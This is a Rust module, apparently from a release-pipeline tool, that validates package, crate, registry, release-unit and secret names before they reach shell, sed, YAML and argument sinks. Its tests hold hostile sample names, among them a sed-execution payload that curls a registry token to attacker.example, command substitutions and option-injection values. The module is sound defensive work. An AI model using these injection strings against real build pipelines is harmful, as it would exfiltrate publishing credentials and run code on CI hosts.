// ---
// relationships:
//   implements: github-release-executor
// ---

//! Validation of every name a repository supplies to a maintained recipe.
//!
//! A publisher job's steps are shell scripts, YAML documents and command lines
//! built by derivation. Most of what they contain this executor chose. A few
//! values did not come from here: they were read out of the repository being
//! released — a package manifest, a configuration key — and they reach places
//! that interpret text.
//!
//! Those places are the reason this module exists rather than a quoting
//! convention at each call site. The sinks a repository-supplied name can reach
//! are:
//!
//! * **Shell text.** A `run:` body is source, and these bodies hold registry
//!   credentials. Routing through `env:` and quoting keeps a value data.
//! * **Interpreted arguments.** Quoting a value into a shell command does not
//!   stop the command from interpreting it. A `sed` script is the case that
//!   matters here: GNU `sed`'s `e` command executes its argument through a
//!   shell, so a name reaching a `sed` address is executable text no amount of
//!   shell quoting contains.
//! * **YAML scalars.** A name written into a document with `printf '"%s"'` can
//!   close the quote or break the line, producing a document whose loader
//!   rejects it — three jobs after the step that wrote it.
//! * **Argument vectors.** A name passed as its own `argv` element is data to
//!   the shell, and still whatever the receiving program makes of it.
//!
//! Enumerating the sinks is how the rule was chosen, not a substitute for it.
//! Every one of them is safe for a name that is an identifier over a small
//! character set, and each function here refuses anything else at the point the
//! value enters the model. A caller therefore never has to know which sinks its
//! value will reach, which is the property a per-sink escape does not give: the
//! next sink is added by someone who does not know the value was ever
//! dangerous.

/// One name a repository supplied, and where it came from.
///
/// The origin is carried so a refusal names the file the author has to edit
/// rather than the internal value it became.
pub struct SuppliedName<'a> {
    /// Configured or manifest location the value was read from.
    pub origin: &'a str,
    /// Value as the repository spelled it.
    pub value: &'a str,
}

/// Characters an npm package name may carry beyond letters and digits.
///
/// npm's own rule is wider than this in its history and narrower in its
/// present: the registry has accepted uppercase and other punctuation in names
/// created long ago, and rejects them for new ones. The maintained recipe reads
/// what a repository publishes today, so the modern set is what it admits, and
/// a legacy name is refused with a diagnostic rather than carried into a
/// credentialed script.
const NPM_EXTRA: [char; 4] = ['-', '.', '_', '~'];

/// Characters a Cargo crate name may carry beyond letters and digits.
const CARGO_EXTRA: [char; 2] = ['-', '_'];

/// Characters a GitHub secret identifier may carry beyond letters and digits.
const SECRET_EXTRA: [char; 1] = ['_'];

/// Characters a Cargo registry name may carry beyond letters and digits.
const REGISTRY_EXTRA: [char; 2] = ['-', '_'];

/// Characters a release-unit identifier may carry beyond letters and digits.
const RELEASE_UNIT_EXTRA: [char; 3] = ['-', '.', '_'];

/// Reject an npm package name a maintained recipe would carry into a script.
///
/// A scoped name is one scope segment and one name segment, each held to the
/// same rule; an unscoped name is the name segment alone.
pub fn npm_package(supplied: &SuppliedName<'_>) -> Result<String, String> {
    let name = supplied.value;
    let accepted = match name.strip_prefix('@') {
        None => segment(name, &NPM_EXTRA),
        Some(scoped) => match scoped.split_once('/') {
            Some((scope, package)) => segment(scope, &NPM_EXTRA) && segment(package, &NPM_EXTRA),
            None => false,
        },
    };
    if accepted {
        Ok(name.to_owned())
    } else {
        Err(refusal(
            supplied,
            "an npm package name",
            "an optional @scope/ followed by letters, digits, hyphens, dots, underscores and tildes, each part starting with a letter or digit",
        ))
    }
}

/// Reject a Cargo crate name a maintained recipe would carry into a script.
pub fn cargo_crate(supplied: &SuppliedName<'_>) -> Result<String, String> {
    accept(
        supplied,
        &CARGO_EXTRA,
        "a crate name",
        "letters, digits, hyphens and underscores, starting with a letter or digit",
    )
}

/// Reject a configured Cargo registry name a maintained recipe will not name.
///
/// The name becomes a `--registry` argument in a `run:` body that holds the
/// registry token, and part of the `CARGO_REGISTRIES_<NAME>_TOKEN` variable
/// cargo reads.
pub fn registry(supplied: &SuppliedName<'_>) -> Result<String, String> {
    accept(
        supplied,
        &REGISTRY_EXTRA,
        "a Cargo registry name",
        "letters, digits, hyphens and underscores, starting with a letter or digit",
    )
}

/// Reject a release-unit identifier a maintained recipe would write into evidence.
///
/// The identifier is a configuration mapping key, so it is repository content
/// like any manifest value. It reaches an Action input, a YAML scalar in the
/// observation, and the publication identity verification resolves.
pub fn release_unit(supplied: &SuppliedName<'_>) -> Result<String, String> {
    accept(
        supplied,
        &RELEASE_UNIT_EXTRA,
        "a release-unit identifier",
        "letters, digits, hyphens, dots and underscores, starting with a letter or digit",
    )
}

/// Reject a configured secret name GitHub could not resolve.
///
/// The name is spliced into a `${{ secrets.NAME }}` expression, which is an
/// identifier position rather than a value position: a name carrying a bracket
/// or a quote would not name a missing secret, it would change what the
/// expression evaluates.
pub fn secret(configured: Option<&SuppliedName<'_>>, conventional: &str) -> Result<String, String> {
    let Some(supplied) = configured else {
        return Ok(conventional.to_owned());
    };
    if segment(supplied.value, &SECRET_EXTRA)
        && !supplied
            .value
            .starts_with(|character: char| character.is_ascii_digit())
    {
        Ok(supplied.value.to_owned())
    } else {
        Err(refusal(
            supplied,
            "a GitHub secret name",
            "letters, digits and underscores, not starting with a digit",
        ))
    }
}

/// Accept one whole name held to a single segment rule.
fn accept(
    supplied: &SuppliedName<'_>,
    extra: &[char],
    noun: &str,
    permitted: &str,
) -> Result<String, String> {
    if segment(supplied.value, extra) {
        Ok(supplied.value.to_owned())
    } else {
        Err(refusal(supplied, noun, permitted))
    }
}

/// Whether one segment is an identifier over letters, digits and `extra`.
///
/// The leading character is held to letters and digits separately, because
/// every one of these ecosystems refuses a name beginning with its punctuation
/// and because a leading `-` is an option rather than a name wherever the value
/// reaches an argument vector.
fn segment(value: &str, extra: &[char]) -> bool {
    !value.is_empty()
        && value.starts_with(|character: char| character.is_ascii_alphanumeric())
        && value
            .chars()
            .all(|character| character.is_ascii_alphanumeric() || extra.contains(&character))
}

/// One refusal naming the value, where it came from, and what is permitted.
fn refusal(supplied: &SuppliedName<'_>, noun: &str, permitted: &str) -> String {
    format!(
        "{} is not {noun}: {:?} reaches a maintained recipe's scripts and evidence, which admit {permitted}",
        supplied.origin, supplied.value
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn supplied(value: &str) -> SuppliedName<'_> {
        SuppliedName {
            origin: "component",
            value,
        }
    }

    // The reproductions the review filed, kept as the cases they are: a name
    // that reaches a `sed` address where GNU `sed`'s `e` command executes it,
    // and a name that closes the quote of the YAML scalar it is printed into.
    // Both derived cleanly before this rule existed, and both are refused by
    // the same rule that refuses the ordinary typos below.
    #[test]
    fn refuses_a_name_that_would_execute_or_reshape_what_it_reaches() {
        for hostile in [
            r#"a"$/e echo PWNED; sh -c 'curl http://attacker.example/$CARGO_REGISTRY_TOKEN' #"#,
            "a\"; curl http://attacker.example",
            "a\nname",
            "a$(id)",
            "a`id`",
            "a'b",
            // A name is passed as its own argument vector element in several
            // places, and a leading hyphen there is an option rather than a
            // name. These carry no character the charsets refuse, so the
            // leading-character rule is the only thing standing between them
            // and a command line -- which is why they are listed separately
            // from the values that would also fail on their contents.
            "-oProxyCommand",
            "--registry",
            "-rf",
            // Every one of these ecosystems refuses a name beginning with its
            // own punctuation, so a name that starts with one is not a name
            // this recipe could publish under.
            ".hidden",
            "_private",
            "-oProxyCommand=id",
            "",
        ] {
            let supplied = supplied(hostile);
            assert!(
                cargo_crate(&supplied).is_err(),
                "a crate name admits {hostile:?}"
            );
            assert!(
                npm_package(&supplied).is_err(),
                "an npm package name admits {hostile:?}"
            );
            assert!(
                registry(&supplied).is_err(),
                "a registry name admits {hostile:?}"
            );
            assert!(
                release_unit(&supplied).is_err(),
                "a release-unit identifier admits {hostile:?}"
            );
            assert!(
                secret(Some(&supplied), "CONVENTIONAL").is_err(),
                "a secret name admits {hostile:?}"
            );
        }
    }

    #[test]
    fn accepts_the_names_these_ecosystems_actually_publish() {
        for name in ["serde", "example-component", "example_component", "tokio1"] {
            assert!(cargo_crate(&supplied(name)).is_ok(), "{name}");
        }
        for name in [
            "example-component",
            "@example-owner/example-component",
            "lodash.merge",
            "example~1",
        ] {
            assert!(npm_package(&supplied(name)).is_ok(), "{name}");
        }
        // A scope without a package, and a package without a scope after the
        // marker, are both incomplete rather than merely unusual.
        for name in ["@example-owner", "@example-owner/", "@/example-component"] {
            assert!(npm_package(&supplied(name)).is_err(), "{name}");
        }
        assert_eq!(
            secret(None, "NPM_TOKEN").expect("the conventional name stands"),
            "NPM_TOKEN"
        );
        assert!(secret(Some(&supplied("1TOKEN")), "NPM_TOKEN").is_err());
    }
}
